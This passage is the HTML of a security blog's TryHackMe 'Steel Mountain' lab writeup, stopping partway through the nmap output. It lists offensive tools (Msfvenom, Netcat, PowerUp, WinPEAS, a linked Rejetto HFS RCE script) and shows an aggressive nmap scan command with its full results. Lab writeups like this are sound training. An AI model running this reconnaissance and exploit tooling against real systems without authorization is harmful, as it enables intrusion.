@@ -1,0 +1,534 @@
+<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.7.0"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Writeup for TryHackMe room - Steel Mountain" /><meta name="author" content="4n3i5v74" /><meta property="og:locale" content="en_US" /><meta name="description" content="A Security Blog from 4n3i5v74. Used for techincal contents, learning, writeups." /><meta property="og:description" content="A Security Blog from 4n3i5v74. Used for techincal contents, learning, writeups." /><link rel="canonical" href="https://4n3i5v74.github.io/posts/tryhackme-steel-mountain/" /><meta property="og:url" content="https://4n3i5v74.github.io/posts/tryhackme-steel-mountain/" /><meta property="og:site_name" content="4n3i5v74" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-03-24T00:00:00+05:30" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Writeup for TryHackMe room - Steel Mountain" /><meta name="twitter:site" content="@nive1103" /><meta name="twitter:creator" content="@4n3i5v74" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"4n3i5v74"},"headline":"Writeup for TryHackMe room - Steel Mountain","dateModified":"2021-05-17T12:44:16+05:30","datePublished":"2021-03-24T00:00:00+05:30","description":"A Security Blog from 4n3i5v74. Used for techincal contents, learning, writeups.","url":"https://4n3i5v74.github.io/posts/tryhackme-steel-mountain/","mainEntityOfPage":{"@type":"WebPage","@id":"https://4n3i5v74.github.io/posts/tryhackme-steel-mountain/"},"@type":"BlogPosting","@context":"https://schema.org"}</script><title>Writeup for TryHackMe room - Steel Mountain | 4n3i5v74</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/local.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/copy-code.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">4n3i5v74</a></div><div class="site-subtitle font-italic">A Security Blog.</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <span class="icon-border"></span> <a href="https://github.com/4n3i5v74" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span>Posts</span> <span>Writeup for TryHackMe room - Steel Mountain</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Writeup for TryHackMe room - Steel Mountain</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Wed, Mar 24, 2021, 12:00 AM +0530" > Mar 24 <i class="unloaded">2021-03-24T00:00:00+05:30</i> </span> by <span class="author"> 4n3i5v74 </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Mon, May 17, 2021, 12:44 PM +0530" > May 17 <i class="unloaded">2021-05-17T12:44:16+05:30</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2582 words">14 min</span></div></div><div class="post-content"><div class="flex-container"> <script src="https://tryhackme.com/badge/34685"></script></div><h2 id="steel-mountain"><a href="https://tryhackme.com/room/steelmountain" target="_blank">Steel Mountain</a></h2><p>This room contains detailed info about <code>rejetto</code> http vulnerability exploitation and privilege escalation methods.</p><p>For complete tryhackme path, refer the <a href="https://4n3i5v74.github.io/posts/getting-started-with-cybersecurity-tryhackme/" target="_blank">link</a>.</p><h2 id="tools-used">Tools Used</h2><h3 id="enumeration">Enumeration</h3><ul><li>NMAP</ul><h3 id="exploitation">Exploitation</h3><ul><li>Msfconsole<li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1" target="_blank">PowerUp</a><li>Msfvenom<li>Netcat<li><a href="https://www.exploit-db.com/exploits/39161" target="_blank">Rejetto HTTP File Server RCE script</a><li><a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe" target="_blank">Netcat for windows</a><li><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe" target="_blank">WinPEAS</a></ul><h2 id="task-1---introduction">Task 1 - Introduction</h2><h3 id="references">References</h3><ul><li><a href="https://4n3i5v74.github.io/posts/cheatsheet-nmap/" target="_blank">NMAP Reference</a></ul><p>Use <code>nmap</code> to enumerate the target machine using <code>nmap -PN -T4 -sS --top-ports 1000 -A &lt;ip&gt;</code></p><p>The output will be similar to</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Starting%20Nmap%207.60%20(%20https://nmap.org%20)%20at%202021-04-27%2004:18%20BST%0ANmap%20scan%20report%20for%20%3Chostname%3E%20(%3Cip%3E)%0AHost%20is%20up%20(0.00062s%20latency).%0ANot%20shown:%20988%20closed%20ports%0APORT%20%20%20%20%20%20STATE%20SERVICE%20%20%20%20%20%20VERSION%0A80/tcp%20%20%20%20open%20%20http%20%20%20%20%20%20%20%20%20Microsoft%20IIS%20httpd%208.5%0A%7C%20http-methods:%0A%7C_%20%20Potentially%20risky%20methods:%20TRACE%0A%7C_http-server-header:%20Microsoft-IIS/8.5%0A%7C_http-title:%20Site%20doesn't%20have%20a%20title%20(text/html).%0A135/tcp%20%20%20open%20%20msrpc%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0A139/tcp%20%20%20open%20%20netbios-ssn%20%20Microsoft%20Windows%20netbios-ssn%0A445/tcp%20%20%20open%20%20microsoft-ds%20Microsoft%20Windows%20Server%202008%20R2%20-%202012%20microsoft-ds%0A3389/tcp%20%20open%20%20ssl%20%20%20%20%20%20%20%20%20%20Microsoft%20SChannel%20TLS%0A%7C%20fingerprint-strings:%0A%7C%20%20%20TLSSessionReq:%0A%7C%20%20%20%20%20steelmountain0%0A%7C%20%20%20%20%20210426031434Z%0A%7C%20%20%20%20%20211026031434Z0%0A%7C%20%20%20%20%20steelmountain0%0A%7C%20%20%20%20%20%3CJLg%0A%7C%20%20%20%20%20u3ox%0A%7C%20%20%20%20%20$0%220%0A%7C%20%20%20%20%20%5Cx8e%0A%7C%20%20%20%20%20o-5u%0A%7C_%20%20%20%20Q%3E)@C%0A%7C%20ssl-cert:%20Subject:%20commonName=steelmountain%0A%7C%20Not%20valid%20before:%202021-04-26T03:14:34%0A%7C_Not%20valid%20after:%20%202021-10-26T03:14:34%0A%7C_ssl-date:%202021-04-27T03:20:26+00:00;%200s%20from%20scanner%20time.%0A8080/tcp%20%20open%20%20http%20%20%20%20%20%20%20%20%20HttpFileServer%20httpd%202.3%0A%7C_http-server-header:%20HFS%202.3%0A%7C_http-title:%20HFS%20/%0A49152/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0A49153/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0A49154/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0A49155/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0A49156/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0A49163/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0A%0A1%20service%20unrecognized%20despite%20returning%20data.%20If%20you%20know%20the%20service/version,%20please%20submit%20the%20following%20fingerprint%20at%20https://nmap.org/cgi-bin/submit.cgi?new-service%20:%0ASF-Port3389-TCP:V=7.60%25I=7%25D=4/27%25Time=608782BE%25P=x86_64-pc-linux-gnu%25r(TL%0ASF:SSessionReq,346,%22%5Cx16%5Cx03%5Cx03%5Cx03A%5Cx02%5C0%5C0M%5Cx03%5Cx03'%5Cx87%5Cx82%5Cxb9h@%5Cxf6Q%0ASF:%5Cx8cf%5Cxd6%5Cxd1%5Cx7f%5Cxfa%5Cx10X%5Cxbb%5Cx83x%5Cxf9%5Cxff1%5Cx8b%5Cxe9m%5Cx8b%5Cxa2%5Cxa5%5Cx1d%5Cx%0ASF:b3%5Cx05%5Cxa0%5Cx20%5Cxa7%5Cx1e%5C0%5C0%5Cx1bDt%7D%5Cx1e%5Cxf5W%5Cxb9%5Cxcc%5Cx03%5Cxb7%5Cxd0%5C?%5Cx1fq9%5C%0ASF:xaa%5Cxb3%5Cxa7%5Cx9d%5Cx83%5Cxb5%5Cx05%5Cxc7%5Cxbd%5Cxef%5Cxc6Z%5C0/%5C0%5C0%5Cx05%5Cxff%5Cx01%5C0%5Cx01%5C0%0ASF:%5Cx0b%5C0%5Cx02%5Cxe8%5C0%5Cx02%5Cxe5%5C0%5Cx02%5Cxe20%5Cx82%5Cx02%5Cxde0%5Cx82%5Cx01%5Cxc6%5Cxa0%5Cx03%5Cx0%0ASF:2%5Cx01%5Cx02%5Cx02%5Cx10iV%5Cxa9x%5Cxf6%5Cx8bc%5CxacF%5Cx81%5Cxde%5Cx06%5Cxebp%5Cx01%5Cxa60%5Cr%5Cx06%5C%0ASF:t%5C*%5Cx86H%5Cx86%5Cxf7%5Cr%5Cx01%5Cx01%5Cx05%5Cx05%5Cx000%5Cx181%5Cx160%5Cx14%5Cx06%5Cx03U%5Cx04%5Cx03%5C%0ASF:x13%5Crsteelmountain0%5Cx1e%5Cx17%5Cr210426031434Z%5Cx17%5Cr211026031434Z0%5Cx181%5Cx16%0ASF:0%5Cx14%5Cx06%5Cx03U%5Cx04%5Cx03%5Cx13%5Crsteelmountain0%5Cx82%5Cx01%5C%220%5Cr%5Cx06%5Ct%5C*%5Cx86H%5Cx8%0ASF:6%5Cxf7%5Cr%5Cx01%5Cx01%5Cx01%5Cx05%5C0%5Cx03%5Cx82%5Cx01%5Cx0f%5Cx000%5Cx82%5Cx01%5Cn%5Cx02%5Cx82%5Cx01%5Cx0%0ASF:1%5C0%5Cxac%5Cx10%5Cxff%5Cx1ba5C%5Cx93%5Cx12%5Cxd4%5Cx86%5Cxc1/%5Cxf4%5C%5E6%5Cx19M%5Cx8b%5Cxf5%5Cx9e%5Cxb5%0ASF:u%5Cx06%5Cx85%5Cxc2i%5Cxf5C%5Cxeb%5Cx0e%3CJLg%5Cxbb%5Cxda%5Cxec9%5Cx20%5Cxabu3ox%5Cxea%5Cxd3%5C%7C%5Cxa4%5C%0ASF:x92%5Cr%5Cxc6j%5Cx03%5Cxe6%5CxccG%5Cxf5z%5Cxf7oW5%5Cx0b%5Cxf5%5Cx18%5Cxe1Pfs%5Cx89c%5CxeacfY%5CxfdC%0ASF:%5Cxb8%5Cxc1%5Cx90%5Cxe7%5Cx90M#%5Cx06%5Cxea%5Cx1f%5Cx94%5Cx07%5Cx9c%5Cxe1Y%5CxcdT%5Cx85%5Cx96_%5Cx99%5Cx%0ASF:dd%5Cx9b%5Cxdei%5Cxb0%5Cx18g;%5Cxa6tQ%5Cxba%5C%22X!%5Cxe1%5Cxe0%5Cxb67l%5Cxdf%5C0%5Cxef%5Cxdf#%5Cx02%5Cx0%0ASF:1M%5Cxb9%5Cxda%5Cx83%5Cxfe%5Cx94%5Cx14r%5Cxc5#%5Cxff%5Cxb6%5Cxe3%5Cx91%5Cxf4%5Cxc2%5Cx19's%5Cxbc~%5Cxd2%0ASF:%5Cxcet%5Cxb2%5Cxa7%5Cxa4%5C+c%5Cx10%5Cxaas%5Cx0b%5Cxa2%5Cx91%5C.%5Cx96%5Cxa1%5Cx1dp%5Cx1f%5Cx1c%5Cx05%5Cx8%0ASF:3%5Cxaa%5C+7%5Cxd8%5Cxfa#%5Cxf04%5Cxae%5Cxe6A%5Cx9a%5Cxba%5Cx9f%5Cx9e%5Cxce%5Cxfa%5Cx17:p%5Cx90%5C%22%5Cxf7%0ASF:V%5Cxb6l%5C0%5Cxdc%5Cxc1/%5Cxa4%5C(z%5Cxe37b%5Cx94n%5Cxc3l%5Cxdb%5Cx1b%5Cxc4%5C%22%5Cxaa%5Cxc1SJ%5Cxdf-%5Cx%0ASF:fb%5Cx17Kl%5Cxb0W%5Cx96%5Cxa8%5Cxf0%5Cxde%5Cx18/Xk%5Cx8f%5Cxb3%5Cxf3%5Cx16%5Cx84%5Cxe69%5Cx8c%5Cxda%5Cx%0ASF:a0=%5Cxf8%3E%5Cx8e%5Cx96%5Cx11L/%5Cxf1UG%5Cxb9%5Cx02%5Cx03%5Cx01%5C0%5Cx01%5Cxa3%5C$0%5C%220%5Cx13%5Cx06%5Cx0%0ASF:3U%5Cx1d%25%5Cx04%5Cx0c0%5Cn%5Cx06%5Cx08%5C+%5Cx06%5Cx01%5Cx05%5Cx05%5Cx07%5Cx03%5Cx010%5Cx0b%5Cx06%5Cx03U%5C%0ASF:x1d%5Cx0f%5Cx04%5Cx04%5Cx03%5Cx02%5Cx0400%5Cr%5Cx06%5Ct%5C*%5Cx86H%5Cx86%5Cxf7%5Cr%5Cx01%5Cx01%5Cx05%5Cx05%5C%0ASF:0%5Cx03%5Cx82%5Cx01%5Cx01%5C0%5C$%5Cx92%5Cx92%5Cx962%5Cxd1c%5Cx08/l%5Cx0b%5Cxe8p%5Cxa3%5Cx89%5Cxfc%5Cxad%5C%0ASF:x15%7D%5Cxaa%5Cx0c%5Cxe0%5Cxec%5Cxf3%5Cxaa%5Cx82%5Cx85%5Cx0b%5Cx80o%5Cxfe2%5Cx89I%5Cxe5%5Cxbb%5Cx1a%5Cxe4%0ASF:%5Cxd4%7BD:%5Cxdc2%5Cxcf%5Cxab%5CnGiL%5Cxd9%5Cx96%5Cxf5%5C$U%5Cxe2%5Cx84@%5Cxc9%5Cx03%5Cxb6%5Cxf3%5Cxc2%5Cx%0ASF:8a%5Cxf47%25L%5Cx97g%5Cx8b%5Cx0bmz%5CxadF%5Cx05%5Cx91%5Cxaf%5Cx17%5Cxbf%5Cxc2%5Cxdb%5Cx14%5Cxe8TEd%5Cx1%0ASF:3%5Cx83%5C0/%5C?%5Cxcf%5C]%5Cxfbs%5C?%5Cxb8%5Cxd0X%5Cxb0U'%5Cx1b%5Cxc0%5Cxc2%5Cx87%5Cxbe%7B%5Cx1c%5Cx1df%5Cxd%0ASF:5%5Cxf5%5Cxe6%5Cxcf%5Cxa6%5Cxb1%5C%22%5Cx19%5Cx10%5Cxa5%5Cx11%5CnuD%5Cxe3%5Cx99%5C%5C%5Cx8e%5Cxff%5Cr&amp;@%5Cx97%5Cx%0ASF:f8o-5u%5Cxa0%5Cx8fOV%5Cxd2%5Cx17%5Cx07%5Cx07%5Cxe8%5Cx20%5Cxee%5Cx8c%5Cx99%5Cx9c%5Cx91Q%3E%5C)@C%5Cx91%5C%0ASF:xc1I1%5C%5E%5Cx1c%5Cxa1_/%5Cxf4%5Cx0e%5Cx81D%5Cxd7zW%5Cx9d%5Cxe1%5C%5E%5Cx9b%5Cxc04%5Cx04J%5Cxed%5Cxb4%5Cxd%0ASF:dW'P%5Cxfc%5Cxce%5Cx93%5Cxff%5Cxca%5Cxaeu%5Cxf4%5Cx8e%5Cx19%5Cxbf%5Cxcdy%3E%5Cxec%5Cx10N#%5Cx03%5Cxa0%5Cx%0ASF:1f%5Cxd71%5Cxfd%5Cx87%5Cxe3%5C)mk%5Cx85%5Cxce,%5Cxa7h%3EM%5Cxe1%3C%5Cxa8%5Cn%5Cxf9-j%5Cxf7%5Cxc4@%5Cxe9cc%0ASF:%5Cxd0s%5Cx8d%5Cxcd%5Cx13%5Cxe1%5Cxd3_%5Cxe5%5Cxc2q%5Cxb6%5Cxbd%5Cxd7%5Cxc6%5Cxa5%5Cx0e%5C0%5C0%5C0%22);%0A%0AMAC%20Address:%2002:9C:5A:A0:F7:B9%20(Unknown)%0A%0ANo%20exact%20OS%20matches%20for%20host%20(If%20you%20know%20what%20OS%20is%20running%20on%20it,%20see%20https://nmap.org/submit/%20).%0A%0ATCP/IP%20fingerprint:%0AOS:SCAN(V=7.60%25E=4%25D=4/27%25OT=80%25CT=1%25CU=40904%25PV=Y%25DS=1%DC=D%25G=Y%25M=029C5A%25T%0AOS:M=60878300%25P=x86_64-pc-linux-gnu)SEQ(SP=100%25GCD=1%25ISR=10F%25TI=I%25CI=I%25TS=7%0AOS:)SEQ(SP=100%25GCD=1%25ISR=10F%25TI=I%25CI=RD%25II=I%25SS=S%25TS=7)OPS(O1=M2301NW8ST11%25%0AOS:O2=M2301NW8ST11%25O3=M2301NW8NNT11%25O4=M2301NW8ST11%25O5=M2301NW8ST11%25O6=M230%0AOS:1ST11)WIN(W1=2000%25W2=2000%25W3=2000%25W4=2000%25W5=2000%25W6=2000)ECN(R=Y%DF=Y%25T%0AOS:=80%25W=2000%25O=M2301NW8NNS%CC=Y%25Q=)T1(R=Y%DF=Y%25T=80%25S=O%25A=S+%25F=AS%25RD=0%25Q=)%0AOS:T2(R=Y%DF=Y%25T=80%25W=0%25S=Z%25A=S%25F=AR%25O=%25RD=0%25Q=)T3(R=Y%DF=Y%25T=80%25W=0%25S=Z%25A=%0AOS:O%25F=AR%25O=%25RD=0%25Q=)T4(R=Y%DF=Y%25T=80%25W=0%25S=A%25A=O%25F=R%25O=%25RD=0%25Q=)T5(R=Y%DF=%0AOS:Y%25T=80%25W=0%25S=Z%25A=S+%25F=AR%25O=%25RD=0%25Q=)T6(R=Y%DF=Y%25T=80%25W=0%25S=A%25A=O%25F=R%25O=%25%0AOS:RD=0%25Q=)T7(R=Y%DF=Y%25T=80%25W=0%25S=Z%25A=S+%25F=AR%25O=%25RD=0%25Q=)U1(R=Y%DF=N%25T=80%25I%0AOS:PL=164%25UN=0%25RIPL=G%25RID=G%25RIPCK=G%25RUCK=G%25RUD=G)IE(R=Y%DFI=N%25T=80%CD=Z)%0A%0ANetwork%20Distance:%201%20hop%0AService%20Info:%20OSs:%20Windows,%20Windows%20Server%202008%20R2%20-%202012;%20CPE:%20cpe:/o:microsoft:windows%0A%0AHost%20script%20results:%0A%7C_nbstat:%20NetBIOS%20name:%20STEELMOUNTAIN,%20NetBIOS%20user:%20%3Cunknown%3E,%20NetBIOS%20MAC:%2002:9c:5a:a0:f7:b9%20(unknown)%0A%7C%20smb-security-mode:%0A%7C%20%20%20account_used:%20%3Cblank%3E%0A%7C%20%20%20authentication_level:%20user%0A%7C%20%20%20challenge_response:%20supported%0A%7C_%20%20message_signing:%20disabled%20(dangerous,%20but%20default)%0A%7C%20smb2-security-mode:%0A%7C%20%20%202.02:%0A%7C_%20%20%20%20Message%20signing%20enabled%20but%20not%20required%0A%7C%20smb2-time:%0A%7C%20%20%20date:%202021-04-27%2004:20:26%0A%7C_%20%20start_date:%202021-04-27%2004:14:25%0A%0ATRACEROUTE%0AHOP%20RTT%20%20%20%20%20ADDRESS%0A1%20%20%200.62%20ms%20%3Chostname%3E%20(%3Cip%3E)%0A%0AOS%20and%20Service%20detection%20performed.%20Please%20report%20any%20incorrect%20results%20at%20https://nmap.org/submit/%20.%0ANmap%20done:%201%20IP%20address%20(1%20host%20up)%20scanned%20in%2094.93%20seconds" type="button"></button></div></div><pre><code>Starting Nmap 7.60 ( https://nmap.org ) at 2021-04-27 04:18 BST
+Nmap scan report for &lt;hostname&gt; (&lt;ip&gt;)
+Host is up (0.00062s latency).
+Not shown: 988 closed ports
+PORT      STATE SERVICE      VERSION
+80/tcp    open  http         Microsoft IIS httpd 8.5
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/8.5
+|_http-title: Site doesn't have a title (text/html).
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+3389/tcp  open  ssl          Microsoft SChannel TLS
+| fingerprint-strings:
+|   TLSSessionReq:
+|     steelmountain0
+|     210426031434Z
+|     211026031434Z0
+|     steelmountain0
+|     &lt;JLg
+|     u3ox
+|     $0"0
+|     \x8e
+|     o-5u
+|_    Q&gt;)@C
+| ssl-cert: Subject: commonName=steelmountain
+| Not valid before: 2021-04-26T03:14:34
+|_Not valid after:  2021-10-26T03:14:34
+|_ssl-date: 2021-04-27T03:20:26+00:00; 0s from scanner time.
+8080/tcp  open  http         HttpFileServer httpd 2.3
+|_http-server-header: HFS 2.3
+|_http-title: HFS /
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49155/tcp open  msrpc        Microsoft Windows RPC
+49156/tcp open  msrpc        Microsoft Windows RPC
+49163/tcp open  msrpc        Microsoft Windows RPC
+
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port3389-TCP:V=7.60%I=7%D=4/27%Time=608782BE%P=x86_64-pc-linux-gnu%r(TL
+SF:SSessionReq,346,"\x16\x03\x03\x03A\x02\0\0M\x03\x03'\x87\x82\xb9h@\xf6Q
+SF:\x8cf\xd6\xd1\x7f\xfa\x10X\xbb\x83x\xf9\xff1\x8b\xe9m\x8b\xa2\xa5\x1d\x
+SF:b3\x05\xa0\x20\xa7\x1e\0\0\x1bDt}\x1e\xf5W\xb9\xcc\x03\xb7\xd0\?\x1fq9\
+SF:xaa\xb3\xa7\x9d\x83\xb5\x05\xc7\xbd\xef\xc6Z\0/\0\0\x05\xff\x01\0\x01\0
+SF:\x0b\0\x02\xe8\0\x02\xe5\0\x02\xe20\x82\x02\xde0\x82\x01\xc6\xa0\x03\x0
+SF:2\x01\x02\x02\x10iV\xa9x\xf6\x8bc\xacF\x81\xde\x06\xebp\x01\xa60\r\x06\
+SF:t\*\x86H\x86\xf7\r\x01\x01\x05\x05\x000\x181\x160\x14\x06\x03U\x04\x03\
+SF:x13\rsteelmountain0\x1e\x17\r210426031434Z\x17\r211026031434Z0\x181\x16
+SF:0\x14\x06\x03U\x04\x03\x13\rsteelmountain0\x82\x01\"0\r\x06\t\*\x86H\x8
